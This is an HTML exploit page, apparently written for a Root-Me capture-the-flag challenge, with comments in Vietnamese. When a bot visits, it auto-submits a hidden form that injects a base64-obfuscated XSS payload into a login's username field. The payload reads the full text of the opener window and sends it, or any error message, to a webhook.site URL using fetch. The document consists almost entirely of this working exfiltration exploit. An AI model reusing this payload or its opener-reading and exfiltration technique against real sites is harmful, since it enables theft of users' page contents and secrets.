<!DOCTYPE html>
<html>
<head>
    <title>Exploit Opener Secrets</title>
</head>
<body>
    <script>
        // --- CẤU HÌNH ---
        const WEBHOOK_URL = 'https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce';
        const CHALLENGE_URL = 'http://challenge01.root-me.org:58003/login';

        /**
         * PAYLOAD XSS SỬ DỤNG OPENER:
         * Script này sẽ kiểm tra xem cửa sổ đã mở ra nó (opener) có nội dung gì không.
         */
        const xssCode = `
            try {
                if (window.opener && window.opener !== window) {
                    // Lấy toàn bộ nội dung text của tab cha
                    var secret = window.opener.document.documentElement.innerText;
                    fetch('${WEBHOOK_URL}?flag=' + btoa(secret));
                } else {
                    // Nếu không có opener, thử kiểm tra cấp độ cao hơn (top)
                    var secretAlt = window.top.opener.document.documentElement.innerText;
                    fetch('${WEBHOOK_URL}?flag_alt=' + btoa(secretAlt));
                }
            } catch(e) {
                fetch('${WEBHOOK_URL}?error=' + btoa(e.message));
            }
        `;

        // Mã hóa Base64 để tránh lỗi SyntaxError dấu ngoặc nhọn
        const encodedXSS = btoa(xssCode.trim());

        /**
         * THỰC THI:
         * POST payload vào username.
         */
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = CHALLENGE_URL;

        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'username';
        
        // Payload eval(atob(...)) để thực thi an toàn trên domain challenge
        input.value = `<script>eval(atob('${encodedXSS}'))<\/script>`;

        form.appendChild(input);
        document.body.appendChild(form);

        // Tự động kích hoạt khi Bot vào trang Vercel
        form.submit();
    </script>
</body>
</html>
